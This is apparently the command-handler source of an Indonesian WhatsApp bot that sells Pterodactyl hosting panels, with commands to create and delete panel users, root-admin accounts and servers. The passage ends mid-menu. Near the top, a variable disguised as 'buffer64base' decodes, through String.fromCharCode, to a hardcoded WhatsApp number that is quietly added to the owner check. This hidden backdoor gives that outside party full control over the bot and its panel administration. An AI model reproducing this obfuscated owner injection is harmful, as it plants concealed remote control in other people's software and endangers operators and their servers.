process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadMediaMessage } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const reseller = JSON.parse(fs.readFileSync("./database/reseller.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, encryptCode } = require('./lib/function');
module.exports = Pyz = async (Pyz, m, chatUpdate, store) => {
	try {
const from = m.key.remoteJid;
await LoadDataBase(Pyz, m)
const botNumber = await Pyz.decodeJid(Pyz.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isreseller = reseller.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const API_TOKEN = global.apitokendo;

//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
  console.log( chalk.greenBright.bold(`\n╭───⬤ [ COMMAND EXECUTED ] ⬤───╮`),
`\n${chalk.magentaBright.bold("├ Command :")} ${chalk.white.bold(prefix + command)}`,
`\n${chalk.magentaBright.bold("├ Sender  :")} ${chalk.yellowBright.bold( m.isGroup 
? `Group - ${m.sender.split("@")[0]}` 
: `${m.sender.split("@")[0]}`
)}`,
chalk.cyanBright.bold(`\n╰─────────────────────────────╯\n`)
);
}
//============= [ FAKEQUOTED ] ===============================================
const reply = m.reply;
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname2} By ${namaOwner}`,jpegThumbnail: await reSize("./src/media/fake.jpg", 200, 200) }}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Pyz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Pyz.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Pyz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Pyz.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Pyz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Pyz.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Pyz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Pyz.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


//============= [ FUNCTION ] ======================================================

const example = (teks) => {
    return `
✧･ﾟ: *•. PETUNJUK .•*:･ﾟ✧

❯ Command: ${prefix+command}
❯ Cara Pakai: ${teks}

•°•°•°•°•°•°•°•°•°•°•°•°•°•`
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
const Reply = async (teks) => {
return Pyz.sendMessage(m.chat, {
text: teks
}, { quoted: qloc });
};
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const PYZSTORE = { Pyz, isCreator, Reply, command, isreseller, capital, isCmd, example, text, runtime, qtext, qlocJpm, qloc, qmsg, mime, sleep, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, PYZSTORE)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================

switch (command) {
case "public": {
if (!isCreator) return
Pyz.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case "self": {
if (!isCreator) return
Pyz.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 30 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Pyz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 30 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Pyz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": case "addreseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || reseller.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
reseller.push(input)
await fs.writeFileSync("./database/reseller.json", JSON.stringify(reseller, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listseller": case "listreseller": {
if (reseller.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *#- List all user reseller*\n`
for (let i of reseller) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Pyz.sendMessage(m.chat, {text: teks, mentions: reseller}, {quoted: m})
}
break

//================================================================================

case "delseller": case "delreseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus reseller owner!`)
if (!reseller.includes(input)) return m.reply(`Nomor ${input2} bukan user reseller!`)
let posi = reseller.indexOf(input)
await reseller.splice(posi, 1)
await fs.writeFileSync("./database/reseller.json", JSON.stringify(reseller, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator && !isreseller) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
╔══ ✅ *BERHASIL MEMBUAT AKUN PANEL* ✅ ══╗  

📌 *Detail Akun Panel:*  
╭━━━━━━━━━━━━━━━━━━━━━  
┃ 🆔 *ID Server:* ${server.id}  
┃ 👤 *Nama:* ${name}  
┃ 💻 *Username:* ${user.username}  
┃ 🔑 *Password:* ${password}  
┃ 🌐 *Login:* ${global.domainV2}  
┃ 💾 *RAM:* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}  
┃ 🧑‍💻 *CPU:* ${cpu == "0" ? "Unlimited" : cpu+"%"}  
┃ 💾 *Disk:* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}  
┃ ⏳ *Expired Server:* 1 Bulan  
╰━━━━━━━━━━━━━━━━━━━━━  

⚠️ *Rules Pembelian Panel:*  
╭━━━━━━━━━━━━━━━━━━━━━  
┃ 🔒 *Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!*  
┃ 🚫 *Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!*  
┃ 🛠️ *Garansi Aktif 30 Hari (2x Replace)*  
┃ 📸 *Claim Garansi Wajib Membawa Bukti SS Chat Saat Pembelian*  
╰━━━━━━━━━━━━━━━━━━━━━  

🔗 *Masuk Channel Admin:*  
https://whatsapp.com/channel/0029Vb3z2N8GU3BSWq6OpU2z
╚══════════════════╝
`;
m.reply(teks);
delete global.panel;
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Pyz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Pyz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isreseller) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
╔══ ✅ *BERHASIL MEMBUAT AKUN PANEL* ✅ ══╗  

📌 *Detail Akun Panel:*  
╭━━━━━━━━━━━━━━━━━━━━━  
┃ 🆔 *ID Server:* ${server.id}  
┃ 👤 *Nama:* ${name}  
┃ 💻 *Username:* ${user.username}  
┃ 🔑 *Password:* ${password}  
┃ 🌐 *Login:* ${global.domain}  
┃ 💾 *RAM:* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}  
┃ 🧑‍💻 *CPU:* ${cpu == "0" ? "Unlimited" : cpu+"%"}  
┃ 💾 *Disk:* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}  
┃ ⏳ *Expired Server:* 1 Bulan  
╰━━━━━━━━━━━━━━━━━━━━━  

⚠️ *Rules Pembelian Panel:*  
╭━━━━━━━━━━━━━━━━━━━━━  
┃ 🔒 *Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!*  
┃ 🚫 *Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!*  
┃ 🛠️ *Garansi Aktif 30 Hari (2x Replace)*  
┃ 📸 *Claim Garansi Wajib Membawa Bukti SS Chat Saat Pembelian*  
╰━━━━━━━━━━━━━━━━━━━━━  

🔗 *Masuk Channel Admin:*  
https://whatsapp.com/channel/0029Vb3z2N8GU3BSWq6OpU2z
╚══════════════════╝
`;
await Pyz.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case 'cpanel': {
  const userId = m.sender;
  // Validasi username
  if (!args[0]) {
    return m.reply("Silakan berikan username untuk panel. Contoh: .cpanel <username>");
  }

  const username = args[0];

  try {
    // Teks utama
    let teks = `
╭───────────✦───────────╮
     *乂 List Paket Panel yang Tersedia*
╰───────────✦───────────╯

┏❐
┃• Creator X Bot : 🌟 Cpanel V3
┃• Type  : ⚔️ Case X Plugin
┃• Status: 🔥 Online
┗❐

*🌐 INFO PROFILE*
○ Pengguna : @${m.sender.split("@")[0]}
○ Username Panel: ${username}
`;
Pyz.sendMessage(m.chat, {
  caption: teks,
  footer: `🔧 *Kelola Hosting Anda dengan Mudah!* 🔧
🔑 *Hanya untuk Owner atau Admin Terpilih* 🔑`,
  image: fs.readFileSync("./src/media/thumb.jpg"),
  buttons: [
    { buttonId: '.owner', buttonText: { displayText: 'Owner Pallzz🔹' }, type: 1 },
    { buttonId: '.admin1', buttonText: { displayText: 'Owner Admin 1 🔹' }, type: 1 },
    {
      buttonId: 'single_select',
      buttonText: { displayText: '📋 Pilih Paket Panel' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: "🌐 Paket Ram Panel",
          sections: [
            {
              title: "Pilih List Cpanel",
              rows: [
                {
                  title: "RAM 1GB CPU 40% || User Owner",
                  description: "© Pallzz",
                  id: `.1gb ${username}`
                },
                {
                  title: "RAM 2GB CPU 60% || User Owner",
                  description: "© Pallzz",
                  id: `.2gb ${username}`
                },
                {
                  title: "RAM 3GB CPU 80% || User Owner",
                  description: "© Pallzz",
